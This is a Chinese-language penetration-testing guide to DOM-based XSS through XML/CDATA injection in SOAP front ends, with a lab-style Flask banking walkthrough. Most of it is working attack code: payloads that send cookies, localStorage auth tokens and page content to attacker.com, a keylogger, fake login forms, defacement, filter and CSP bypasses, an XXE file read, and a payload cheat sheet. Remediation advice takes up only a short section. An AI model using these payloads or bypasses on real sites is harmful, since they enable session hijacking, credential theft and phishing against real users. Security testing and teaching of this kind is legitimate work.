# DOM-based XSS 通过 XML 注入攻击

## 1. 技术概述

### 1.1 漏洞原理

DOM-based XSS 通过 XML 注入是一种组合攻击技术，攻击者通过 XML 注入将恶意 JavaScript 代码注入到服务器响应中，然后利用前端不安全的 DOM 操作（如 `innerHTML`）触发 XSS 执行。

**攻击链：**
```
用户输入 → XML 元素 → 服务器无转义反射 → XML 响应 → 
前端 innerHTML 渲染 → JavaScript 执行
```

**本质原因：**
- 服务器端 XML 响应构造使用字符串插值（如 Python f-string）
- 未对 XML 元素内容进行 HTML 实体编码
- 前端使用 `innerHTML` 等危险方法渲染 XML 内容
- 缺少 Content Security Policy 防护

### 1.2 常见漏洞模式

| 模式 | 描述 | 危险代码示例 |
|------|------|-------------|
| XML 字符串插值 | 使用 f-string/格式化构造 XML | `f"<tag>{user_input}</tag>"` |
| innerHTML 渲染 | 直接将 XML 响应设为 innerHTML | `element.innerHTML = xmlResponse` |
| 无输出编码 | 服务器和客户端均无编码 | 两端都信任数据 |
| CDATA 注入 | 利用 CDATA 绕过 XML 解析 | `<![CDATA[<script>...]]>` |

### 1.3 适用范围

- SOAP Web Service 前端调用
- XML API 数据展示
- RSS 订阅内容渲染
- SVG 图片渲染
- 任何将 XML 响应直接插入 DOM 的场景

---

## 2. 攻击场景

### 2.1 适用目标系统

| 系统特征 | 风险描述 |
|----------|----------|
| SOAP + 前端渲染 | XML 响应被 `innerHTML` 渲染 |
| XML API + SPA | 单页应用解析 XML 到 DOM |
| 仪表板/数据展示 | 显示 XML 格式的账户/交易数据 |
| 文件预览 | 预览 XML/SVG 文件内容 |

### 2.2 典型业务场景

| 业务场景 | 功能示例 | 风险点描述 |
|----------|----------|-----------|
| **银行账户仪表板** | 显示账户余额、交易记录 | `account_id` 参数反射到 XML 响应，前端 `innerHTML` 渲染 |
| **用户资料页面** | 显示用户信息 | 用户可控数据反射到 XML，前端不安全渲染 |
| **数据导出预览** | XML 数据预览 | 导出的 XML 数据被直接插入 DOM |
| **RSS 阅读器** | 显示 RSS 订阅内容 | RSS 内容包含恶意脚本 |

---

## 3. 漏洞探测方法

### 3.1 黑盒测试

#### 3.1.1 输入点识别

关注以下功能点：
- SOAP 端点（`/soap_service`, `/api/soap`）
- XML API 端点（`Content-Type: application/xml`）
- 账户/用户 ID 参数
- 搜索/过滤参数

#### 3.1.2 前端代码审计

**危险模式识别：**
```javascript
// 危险模式 1：innerHTML 直接赋值
document.getElementById('result').innerHTML = xmlResponse;

// 危险模式 2：XML 响应未处理
fetch('/api/xml').then(r => r.text()).then(data => {
    document.getElementById('content').innerHTML = data;
});

// 危险模式 3：SOAP 响应直接渲染
parseSOAPResponse(response).then(data => {
    element.innerHTML = data.account_info;
});
```

#### 3.1.3 初步探测 Payload

**基础 XSS 测试：**
```xml
<account_id><![CDATA[<img src=x onerror=alert(1)>]]></account_id>
```

**CDATA 注入测试：**
```xml
<account_id><![CDATA[<svg/onload=alert(1)>]]></account_id>
```

**事件处理器测试：**
```xml
<account_id><![CDATA[<div onmouseover="alert(1)">hover me</div>]]></account_id>
```

#### 3.1.4 结果验证

**JavaScript 执行确认：**
- 观察是否弹出 alert 对话框
- 检查浏览器开发者工具 Console
- 使用 `alert(document.domain)` 确认执行上下文

**HTML 结构验证：**
- 查看响应源码，确认 CDATA 内容是否完整
- 检查 `innerHTML` 渲染后的 DOM 结构
- 确认事件处理器是否被保留

### 3.2 白盒测试

#### 3.2.1 服务器端代码审计

**Python Flask 危险模式：**
```python
# 危险代码示例 1：f-string 构造 XML
response_xml = f"""
<GetAccountInfoResponse>
    <account_id>{response_data['account_id']}</account_id>
</GetAccountInfoResponse>
"""

# 危险代码示例 2：.format() 构造 XML
response_xml = """
<GetAccountInfoResponse>
    <account_id>{}</account_id>
</GetAccountInfoResponse>
""".format(response_data['account_id'])

# 危险代码示例 3：% 格式化
response_xml = """
<GetAccountInfoResponse>
    <account_id>%s</account_id>
</GetAccountInfoResponse>
""" % response_data['account_id']
```

#### 3.2.2 客户端代码审计

**JavaScript 危险模式：**
```javascript
// 危险模式 1：innerHTML 直接赋值 XML 响应
fetch('/soap_service', {
    method: 'POST',
    body: soapRequest
}).then(response => response.text())
  .then(data => {
      document.getElementById('accountInfo').innerHTML = data;  // 危险！
  });

// 危险模式 2：解析 XML 后不安全渲染
const parser = new DOMParser();
const xmlDoc = parser.parseFromString(data, "text/xml");
const accountInfo = xmlDoc.getElementsByTagName("account_id")[0].textContent;
document.getElementById('accountInfo').innerHTML = accountInfo;  // 如果 accountInfo 包含 HTML 则危险
```

---

## 4. 漏洞利用方法

### 4.1 基础利用技术

#### 4.1.1 CDATA 注入

当服务器使用 CDATA 或未对 XML 内容进行转义时：

```xml
<!-- Payload -->
<account_id><![CDATA[<img src=x onerror=alert(document.domain)>]]></account_id>

<!-- 服务器响应 -->
<GetAccountInfoResponse>
    <account_id><![CDATA[<img src=x onerror=alert(document.domain)>]]></account_id>
</GetAccountInfoResponse>

<!-- 前端 innerHTML 渲染后 -->
<div id="accountInfo">
    <img src=x onerror=alert(document.domain)>
</div>
```

#### 4.1.2 标签注入

当 XML 内容被直接插入 DOM 时：

```xml
<account_id><![CDATA[<script>alert('XSS')</script>]]></account_id>
```

#### 4.1.3 事件处理器注入

```xml
<!-- onerror 事件 -->
<account_id><![CDATA[<img src="invalid" onerror="alert(1)">]]></account_id>

<!-- onload 事件 -->
<account_id><![CDATA[<svg onload="alert(1)">]]></account_id>

<!-- onfocus 事件（配合 autofocus） -->
<account_id><![CDATA[<input autofocus onfocus="alert(1)">]]></account_id>
```

### 4.2 高级利用技术

#### 4.2.1 DOM 操作 Payload

```xml
<account_id><![CDATA[
<script>
// 页面 defacement
document.body.innerHTML = '<h1>XSS by Attacker</h1>';
</script>
]]></account_id>
```

```xml
<account_id><![CDATA[
<script>
// 创建钓鱼表单
var form = document.createElement('form');
form.action = 'http://attacker.com/steal';
form.method = 'GET';
form.innerHTML = `
    <input name="username" placeholder="Username">
    <input name="password" type="password" placeholder="Password">
    <button type="submit">Login</button>
`;
document.body.appendChild(form);
</script>
]]></account_id>
```

#### 4.2.2 数据窃取 Payload

```xml
<account_id><![CDATA[
<script>
// 窃取页面数据
fetch('http://attacker.com/steal', {
    method: 'POST',
    body: JSON.stringify({
        url: window.location.href,
        body: document.body.innerHTML,
        cookies: document.cookie
    })
});
</script>
]]></account_id>
```

#### 4.2.3 组合攻击 Payload

```xml
<account_id><![CDATA[<img src=x onerror="fetch('/soap_service', {method:'POST', body:'<GetAccountInfoRequest><account_id>123456</account_id></GetAccountInfoRequest>'}).then(r=>r.text()).then(d=>fetch('http://attacker.com/exfil?data='+encodeURIComponent(d)))">]]></account_id>
```

### 4.3 后利用技术

#### 4.3.1 凭证窃取

```javascript
// 创建假登录表单覆盖原页面
document.body.innerHTML = `
<form action="http://attacker.com/phish" method="GET">
    <h2>Session Expired - Please Login</h2>
    <input name="username" placeholder="Username" required>
    <input name="password" type="password" placeholder="Password" required>
    <button type="submit">Login</button>
</form>
`;
```

#### 4.3.2 键盘记录

```javascript
document.addEventListener('keypress', function(e) {
    fetch('http://attacker.com/log?key=' + encodeURIComponent(e.key));
});
```

#### 4.3.3 会话劫持

```javascript
// 窃取 Cookie（如果非 HttpOnly）
fetch('http://attacker.com/steal?cookie=' + encodeURIComponent(document.cookie));

// 窃取 localStorage
fetch('http://attacker.com/steal?data=' + encodeURIComponent(localStorage.getItem('auth_token')));
```

---

## 5. 绕过技术

### 5.1 XML 解析绕过

#### 5.1.1 CDATA 嵌套

```xml
<!-- 如果 CDATA 被过滤，尝试嵌套 -->
<account_id><![CDATA[<![CDATA[<script>alert(1)]]>]]></account_id>
```

#### 5.1.2 实体编码

```xml
<!-- HTML 实体编码 -->
<account_id>&lt;img src=x onerror=alert(1)&gt;</account_id>

<!-- 如果服务器解码后反射 -->
<account_id><![CDATA[&lt;img src=x onerror=alert(1)&gt;]]></account_id>
```

### 5.2 前端过滤绕过

#### 5.2.1 标签名绕过

如果过滤 `script` 标签：
```xml
<account_id><![CDATA[<img src=x onerror=alert(1)>]]></account_id>
<account_id><![CDATA[<svg onload=alert(1)>]]></account_id>
<account_id><![CDATA[<body onload=alert(1)>]]></account_id>
```

#### 5.2.2 事件处理器绕过

如果过滤 `onerror`：
```xml
<account_id><![CDATA[<img src=x onload=alert(1)>]]></account_id>
<account_id><![CDATA[<div onmouseover=alert(1)>hover</div>]]></account_id>
<account_id><![CDATA[<input onfocus=alert(1) autofocus>]]></account_id>
```

### 5.3 CSP 绕过

如果存在 Content Security Policy：
```javascript
// 使用 nonce 绕过（如果 CSP 配置不当）
<script nonce="valid-nonce">alert(1)</script>

// 使用 data: URI（如果 script-src 允许 data:）
<script src="data:,alert(1)"></script>

// 使用 eval() 变种（如果 script-src 'unsafe-eval'）
Function("alert(1)")();
```

---

## 6. 实战案例

### 6.1 Flask SOAP Banking Service 利用

**目标环境：**
- Flask 应用运行在 `http://localhost:39111`
- SOAP 端点：`/soap_service`
- 前端文件：`dashboard.html`
- 危险代码：`document.getElementById('accountInfo').innerHTML = data;`

**攻击步骤：**

**步骤 1：认证登录**
```bash
curl -c cookies.txt -b cookies.txt \
  -d "username=john&password=password123" \
  "http://localhost:39111/login"
```

**步骤 2：构造恶意 SOAP 请求**
```bash
curl -X POST "http://localhost:39111/soap_service" \
  -b cookies.txt \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0"?>
<GetAccountInfoRequest>
  <account_id><![CDATA[<img src=x onerror="alert(document.domain)">]]></account_id>
</GetAccountInfoRequest>'
```

**步骤 3：前端渲染触发 XSS**
```javascript
// dashboard.html 中的危险代码
fetch('/soap_service', {
    method: 'POST',
    body: soapRequest
}).then(response => response.text())
  .then(data => {
      document.getElementById('accountInfo').innerHTML = data;  // XSS 触发点
  });
```

**步骤 4：获取 Flag（如果挑战要求）**
```xml
<account_id><![CDATA[<script>
fetch('/page?name=test')
  .then(r => r.text())
  .then(t => {
      const flag = t.match(/flag\{[^}]+\}/)[0];
      alert(flag);
      fetch('http://attacker.com/exfil?flag=' + flag);
  });
</script>]]></account_id>
```

**步骤 5：DOM Defacement 证明**
```xml
<account_id><![CDATA[<script>
document.body.innerHTML = '<h1 style="color:red;font-size:50px;text-align:center;margin-top:100px;">XSS by Attacker</h1>';
</script>]]></account_id>
```

### 6.2 组合攻击：XXE + DOM-based XSS

**攻击链：**
1. 利用 XXE 读取 Flag 文件
2. Flag 内容反射到 XML 响应
3. 同时注入 XSS Payload
4. XSS 执行并 exfiltrate Flag

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///app/flag.txt">
]>
<GetAccountInfoRequest>
  <account_id>&xxe;<![CDATA[<img src=x onerror="fetch('http://attacker.com/exfil?flag='+document.getElementById('accountInfo').innerText)">]]></account_id>
</GetAccountInfoRequest>
```

---

## 7. 检测清单

### 7.1 自动化检测

- [ ] 使用 Burp Suite Scanner 扫描 DOM XSS
- [ ] 使用 DOM Invader 插件检测
- [ ] 使用 Retire.js 检测易受攻击的库
- [ ] 使用 CSP Evaluator 检查 CSP 配置

### 7.2 手工检测

- [ ] 测试所有 XML 输入点是否反射到 DOM
- [ ] 测试 `innerHTML` 是否渲染 XML 内容
- [ ] 测试 CDATA 注入可能性
- [ ] 测试事件处理器是否可注入
- [ ] 确认 JavaScript 执行成功

---

## 8. 修复建议

### 8.1 服务器端修复

**Python Flask 安全代码：**
```python
from xml.sax.saxutils import escape

# 安全代码：XML 实体编码
response_xml = f"""
<GetAccountInfoResponse>
    <account_id>{escape(str(response_data['account_id']))}</account_id>
</GetAccountInfoResponse>
"""

# 或使用 lxml 的自动转义
from lxml import etree

root = etree.Element("GetAccountInfoResponse")
account_id_elem = etree.SubElement(root, "account_id")
account_id_elem.text = str(response_data['account_id'])  # 自动转义
response_xml = etree.tostring(root, encoding='unicode')
```

### 8.2 客户端修复

**安全渲染代码：**
```javascript
// 安全做法 1：使用 textContent 代替 innerHTML
document.getElementById('accountInfo').textContent = data;

// 安全做法 2：使用 DOMParser 解析 XML 后提取文本
const parser = new DOMParser();
const xmlDoc = parser.parseFromString(data, "text/xml");
const accountInfo = xmlDoc.getElementsByTagName("account_id")[0].textContent;
document.getElementById('accountInfo').textContent = accountInfo;

// 安全做法 3：使用 DOMPurify 清理 HTML
import DOMPurify from 'dompurify';
document.getElementById('accountInfo').innerHTML = DOMPurify.sanitize(data);
```

### 8.3 添加 Content Security Policy

```python
@app.after_request
def set_csp(response):
    response.headers['Content-Security-Policy'] = "default-src 'self'; script-src 'none'; object-src 'none'"
    return response
```

---

## 9. Payload 速查表

### 9.1 基础 XSS Payload

| 类型 | Payload |
|------|---------|
| img onerror | `<![CDATA[<img src=x onerror=alert(1)>]]>` |
| svg onload | `<![CDATA[<svg onload=alert(1)>]]>` |
| script 标签 | `<![CDATA[<script>alert(1)</script>]]>` |
| input onfocus | `<![CDATA[<input autofocus onfocus=alert(1)>]]>` |

### 9.2 数据窃取 Payload

| 类型 | Payload |
|------|---------|
| Cookie 窃取 | `<script>fetch('http://attacker.com/?c='+document.cookie)</script>` |
| localStorage 窃取 | `<script>fetch('http://attacker.com/?d='+localStorage.getItem('token'))</script>` |
| 页面内容窃取 | `<script>fetch('http://attacker.com/?h='+document.body.innerHTML)</script>` |

### 9.3 DOM 操作 Payload

| 类型 | Payload |
|------|---------|
| 页面 defacement | `<script>document.body.innerHTML='<h1>XSS</h1>'</script>` |
| 钓鱼表单 | `<script>document.body.innerHTML='<form action=http://attacker.com><input name=p></form>'</script>` |
| 重定向 | `<script>window.location='http://attacker.com/phishing'</script>` |

---

## 10. 参考资源

- [OWASP DOM-based XSS](https://owasp.org/www-community/attacks/DOM-based_XSS)
- [PortSwigger - DOM XSS](https://portswigger.net/web-security/cross-site-scripting/dom-based)
- [DOMPurify](https://github.com/cure53/DOMPurify)
- [CSP Documentation](https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP)
